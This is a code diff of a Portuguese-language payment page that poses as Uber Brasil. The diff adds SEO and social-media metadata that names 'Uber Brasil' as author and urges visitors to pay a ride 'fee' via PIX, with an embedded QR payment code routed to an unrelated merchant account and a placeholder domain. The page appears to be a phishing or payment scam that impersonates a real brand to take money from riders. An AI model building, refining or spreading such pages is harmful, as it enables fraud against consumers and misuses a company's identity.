@@ -3,13 +3,34 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+  <!-- SEO Básico -->
+  <meta name="title" content="Pagamento da Taxa | Uber">
+  <meta name="description" content="Confirme sua viagem realizando o pagamento da taxa de transporte via PIX. Página segura e responsiva com QR Code e botão de cópia.">
+  <meta name="keywords" content="Uber, Pagamento, Taxa, QR Code, PIX, Transporte, Viagem, Campinas, Confirmar corrida">
+  <meta name="author" content="Uber Brasil">
+
+  <!-- Open Graph (para redes sociais) -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Pagamento da Taxa | Uber">
+  <meta property="og:description" content="Confirme sua corrida realizando o pagamento da taxa de transporte. Rápido, seguro e fácil via PIX.">
+  <meta property="og:image" content="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/3183d16fa8ea4bae9598635ebdc530875204000053039865802BR5905EFISA6008SAOPAULO62070503***63046192">
+  <meta property="og:url" content="https://seudominio.com/pagamento">
+  <meta property="og:site_name" content="Uber Brasil">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Pagamento da Taxa | Uber">
+  <meta name="twitter:description" content="Finalize seu agendamento de corrida Uber realizando o pagamento da taxa via PIX.">
+  <meta name="twitter:image" content="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/3183d16fa8ea4bae9598635ebdc530875204000053039865802BR5905EFISA6008SAOPAULO62070503***63046192">
+
   <title>Pagamento da Taxa | Uber</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
     }
-
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
@@ -22,12 +43,10 @@
       color: #eee;
       padding: 20px;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(30px); }
       to { opacity: 1; transform: translateY(0); }
     }
-
     .container {
       background: #111;
       padding: 30px;
@@ -38,25 +57,21 @@
       text-align: center;
       animation: popUp 0.8s ease;
     }
-
     @keyframes popUp {
       from { transform: scale(0.95); opacity: 0; }
       to { transform: scale(1); opacity: 1; }
     }
-
     .logo {
       font-size: 2rem;
       font-weight: 700;
       color: #fff;
       margin-bottom: 8px;
     }
-
     .subtitle {
       color: #ccc;
       font-size: 0.95rem;
       margin-bottom: 20px;
     }
-
     .ride-info {
       background: #1b1b1b;
       padding: 16px;
@@ -66,7 +81,6 @@
       font-size: 0.9rem;
       line-height: 1.5;
     }
-
     .location {
       display: flex;
       align-items: center;
@@ -74,25 +88,21 @@
       margin-bottom: 8px;
       color: #ccc;
     }
-
     .location-icon {
       width: 10px;
       height: 10px;
       border-radius: 50%;
       background-color: #0f0;
     }
-
     .location-icon.destino {
       background-color: #f00;
     }
-
     .amount {
       font-size: 1.8rem;
       font-weight: bold;
       color: #fff;
       margin-bottom: 16px;
     }
-
     .pix-box {
       background: #222;
       padding: 12px;
@@ -104,7 +114,6 @@
       animation: fadeIn 1s ease 0.5s both;
       user-select: all;
     }
-
     .btn-copy {
       background: #444;
       color: #eee;
@@ -117,12 +126,10 @@
       box-shadow: 0 4px 12px rgba(255, 255, 255, 0.1);
       transition: transform 0.2s ease, background-color 0.3s ease;
     }
-
     .btn-copy:hover {
       background: #666;
       transform: scale(1.05);
     }
-
     .qrcode {
       width: 160px;
       max-width: 100%;
@@ -132,12 +139,10 @@
       animation: pulse 2s infinite;
       background: #fff;
     }
-
     @keyframes pulse {
       0%, 100% { transform: scale(1); }
       50% { transform: scale(1.03); }
     }
-
     .btn-confirm {
       background: #000;
       color: #eee;
@@ -151,38 +156,31 @@
       margin-top: 10px;
       transition: transform 0.2s ease, box-shadow 0.2s ease, background-color 0.3s ease;
     }
-
     .btn-confirm:hover {
       background: #222;
       box-shadow: 0 8px 20px rgba(255, 255, 255, 0.15);
       transform: scale(1.03);
     }
-
     .copiado-msg {
       margin-top: 8px;
       font-size: 0.8rem;
       color: #bbb;
       display: none;
     }
-
     @media (max-width: 480px) {
       .container {
         padding: 24px 18px;
         border-radius: 16px;
       }
-
       .logo {
         font-size: 1.8rem;
       }
-
       .subtitle {
         font-size: 0.9rem;
       }
-
       .amount {
         font-size: 1.5rem;
       }
-
       .btn-copy,
       .btn-confirm {
         font-size: 0.9rem;
@@ -237,6 +235,3 @@
 
 </body>
 </html>
-
-
-
